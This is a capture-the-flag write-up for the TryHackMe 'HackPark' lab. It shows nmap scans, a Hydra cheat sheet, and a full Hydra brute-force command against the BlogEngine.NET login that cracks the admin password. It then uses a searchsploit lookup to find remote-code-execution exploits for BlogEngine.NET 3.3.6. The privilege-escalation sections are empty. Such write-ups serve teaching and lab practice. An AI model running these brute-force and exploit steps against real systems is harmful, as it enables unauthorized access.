# HackPark

| [![Jenkins](../../_static/images/it.png)](https://tryhackme.com/room/hackpark) |
|:--:|
| [https://tryhackme.com/room/hackpark](https://tryhackme.com/room/hackpark) |

SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate privileges to root.

## Brute-force login with Hydra

### Scanning

First run a simple port scan (without Ping)

	nmap -Pn -p- <IP address target machine> -oN portscan

portscan:

    # Nmap 7.92 scan initiated Fri Sep 30 01:06:47 2022 as: nmap -Pn -p- -oN portscan 10.10.104.183
    Nmap scan report for 10.10.104.183
    Host is up (0.039s latency).
    Not shown: 65533 filtered tcp ports (no-response)
    PORT     STATE SERVICE
    80/tcp   open  http
    3389/tcp open  ms-wbt-server
    
    # Nmap done at Fri Sep 30 01:08:46 2022 -- 1 IP address (1 host up) scanned in 119.37 seconds

Run an `-A` scan on the open ports:

	nmap -Pn -T4 -A -p80,3389 <IP address target machine> -oN servicescan

servicescan:

    # Nmap 7.92 scan initiated Fri Sep 30 01:12:20 2022 as: nmap -Pn -T4 -A -p80,3389 -oN servicescan 10.10.104.183
    Nmap scan report for 10.10.104.183
    Host is up (0.039s latency).
    
    PORT     STATE SERVICE            VERSION
    80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-IIS/8.5
    |_http-title: hackpark | hackpark amusements
    | http-methods: 
    |_  Potentially risky methods: TRACE
    | http-robots.txt: 6 disallowed entries 
    | /Account/*.* /search /search.aspx /error404.aspx 
    |_/archive /archive.aspx
    3389/tcp open  ssl/ms-wbt-server?
    | rdp-ntlm-info: 
    |   Target_Name: HACKPARK
    |   NetBIOS_Domain_Name: HACKPARK
    |   NetBIOS_Computer_Name: HACKPARK
    |   DNS_Domain_Name: hackpark
    |   DNS_Computer_Name: hackpark
    |   Product_Version: 6.3.9600
    |_  System_Time: 2022-09-30T00:13:35+00:00
    | ssl-cert: Subject: commonName=hackpark
    | Not valid before: 2022-09-29T00:05:48
    |_Not valid after:  2023-03-31T00:05:48
    |_ssl-date: 2022-09-30T00:13:36+00:00; 0s from scanner time.
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 2012 (89%)
    OS CPE: cpe:/o:microsoft:windows_server_2012
    Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    TRACEROUTE (using port 80/tcp)
    HOP RTT      ADDRESS
    1   40.18 ms 10.9.0.1
    2   40.14 ms 10.10.104.183
    
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Fri Sep 30 01:13:36 2022 -- 1 IP address (1 host up) scanned in 76.02 seconds

There is a web server running on port 80/tcp.

### Exploring

A short exploration of the site gave me a username and a login page. 

| ![Welcome to hackpark](../../_static/images/screenshot-hackpark.png)
|:--:|
| Welcome page clues |

A [reverse image search](https://www.reverseimagesearch.com/) gave the name of the clown.
The source code of the main page reveals an `Administrator` user `admin`. But we already knew that.

### Brute-force admin

Identify what type of request the form is making to the webserver by going to the login page.

Copy the URL:

    http://<IP address target machine>/Account/login.aspx?ReturnURL=/admin/

Type of request:

    # curl -s http://<IP address target machine>/Account/login.aspx?ReturnURL=/admin/ | grep "<form"
        <form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">

Using Burpsuite Intruder, try a brute-force on that `admin` user. Fire up Burpsuite, go to login page, 
set Burpsuite to intercept, and try to log in. Catch the `__VIEWSTATE` for use in Hydra.

| ![Burpsuite proxy intercept](../../_static/images/screenshot-intercept.png)
|:--:|
| Burpsuite intercepted failed login attempt |

Mini hydra cheatsheet:

| Command                                                                                                                                                | Description                                                                                                                                                                       |
|:-------------------------------------------------------------------------------------------------------------------------------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| hydra -P <wordlist> -v <ip> <protocol>                                                                                                                 | Brute force against a protocol of your choice.                                                                                                                                    |
| hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>                                                                           | You can use Hydra to bruteforce usernames as well <br/>as passwords. It will loop through every combination <br/>in your lists. (-vV = verbose mode, showing login <br/>attempts) |
| hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>                                                                                                | Attack a Windows Remote Desktop with a password <br/>list.                                                                                                                        |
| hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:<br/>log=^USER^&pwd=^PASS^&wp-submit=<br/>Log In&testcookie=1:S=Location' | Craft a more specific request for Hydra <br/>to brute force.                                                                                                                      |

Using:

* `-f` to stop the attack when a valid password is found
* `-l` to specify the username for the bruteforce attack
* `-P` to specify the wordlist to use for the bruteforce
* UserName=`^USER^`
* Password=`^PASS^`
* Wordlist for passwords = `/usr/share/wordlists/rockyou.txt`
* IP of the target server = `10.10.39.227`
* Type of attack = `http-post-form`
* Page to attack = `/Account/login.aspx`
* Session info gathered from Burp = `__VIEWSTATE=HyDAVJBUzaoWbePyeU7aJWUKLoIeSNhkpLwoKuSJYYorT2mFK5gG3zW4y%2Faa0Nv60arFkTV0uFNS8cU8Zrhf3QFwm4LeDyJVKQOfqh0GHwiKFm0NU%2BBahqGt9szkQqO6inS92zNkiQ2x6usDxT9Zumz3go6vwo3AfOWIfRNuJeYa%2FsbQ&__EVENTVALIDATION=lSQI5ypG9I3szy4G87w98h3YF4IR%2FNhNTjz1YjdKlGwjWuzNrGbLTR%2Bm%2FHYM84xxxticrZc8pgZrywRT5QrN2kYdTOWNlu0Iw%2FUYZclfGLWghmvGeRx4rfh5oYC8QbeVh60uXYY0FpdFSJGJY4D56nvCYUwXjUfl4QlydaPXqAKiNcb9&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in`
* Adding a Failed login message so we can detect when we have a success = `:Login Failed`

```text
# hydra -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.39.227 http-post-form "/Account/login.aspx:__VIEWSTATE=HyDAVJBUzaoWbePyeU7aJWUKLoIeSNhkpLwoKuSJYYorT2mFK5gG3zW4y%2Faa0Nv60arFkTV0uFNS8cU8Zrhf3QFwm4LeDyJVKQOfqh0GHwiKFm0NU%2BBahqGt9szkQqO6inS92zNkiQ2x6usDxT9Zumz3go6vwo3AfOWIfRNuJeYa%2FsbQ&__EVENTVALIDATION=lSQI5ypG9I3szy4G87w98h3YF4IR%2FNhNTjz1YjdKlGwjWuzNrGbLTR%2Bm%2FHYM84xxxticrZc8pgZrywRT5QrN2kYdTOWNlu0Iw%2FUYZclfGLWghmvGeRx4rfh5oYC8QbeVh60uXYY0FpdFSJGJY4D56nvCYUwXjUfl4QlydaPXqAKiNcb9&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
```

Results:

```text
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-30 05:11:49
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.39.227:80/Account/login.aspx:__VIEWSTATE=HyDAVJBUzaoWbePyeU7aJWUKLoIeSNhkpLwoKuSJYYorT2mFK5gG3zW4y%2Faa0Nv60arFkTV0uFNS8cU8Zrhf3QFwm4LeDyJVKQOfqh0GHwiKFm0NU%2BBahqGt9szkQqO6inS92zNkiQ2x6usDxT9Zumz3go6vwo3AfOWIfRNuJeYa%2FsbQ&__EVENTVALIDATION=lSQI5ypG9I3szy4G87w98h3YF4IR%2FNhNTjz1YjdKlGwjWuzNrGbLTR%2Bm%2FHYM84xxxticrZc8pgZrywRT5QrN2kYdTOWNlu0Iw%2FUYZclfGLWghmvGeRx4rfh5oYC8QbeVh60uXYY0FpdFSJGJY4D56nvCYUwXjUfl4QlydaPXqAKiNcb9&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed
[80][http-post-form] host: 10.10.39.227   login: admin   password: 1qaz2wsx
[STATUS] attack finished for 10.10.39.227 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-30 05:12:42
```

## Compromise the machine 

Logged in as admin, click on the "About" link from the menu.

| ![About](../../_static/images/about.png)
|:--:|
| About page with version information |

    # searchsploit blogengine 3.3.6
    ------------------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                                 |  Path
    ------------------------------------------------------------------------------- ---------------------------------
    BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution             | aspx/webapps/46353.cs
    BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execu | aspx/webapps/47010.py
    BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                        | aspx/webapps/47035.py
    BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code  | aspx/webapps/47011.py
    BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                     | aspx/webapps/47014.py
    ------------------------------------------------------------------------------- ---------------------------------
    Shellcodes: No Results
    Papers: No Results

More on that:

    # searchsploit -m aspx/webapps/46353.cs
      Exploit: BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution
          URL: https://www.exploit-db.com/exploits/46353
         Path: /usr/share/exploitdb/exploits/aspx/webapps/46353.cs
    File Type: HTML document, ASCII text
    
    Copied to: /home/nina/Downloads/46353.cs

Get the CVE:
                                                                                                                 
    # grep CVE 46353.cs
    # CVE : CVE-2019-6714

## Privilege escalation

## Privilege escalation without Metasploit 
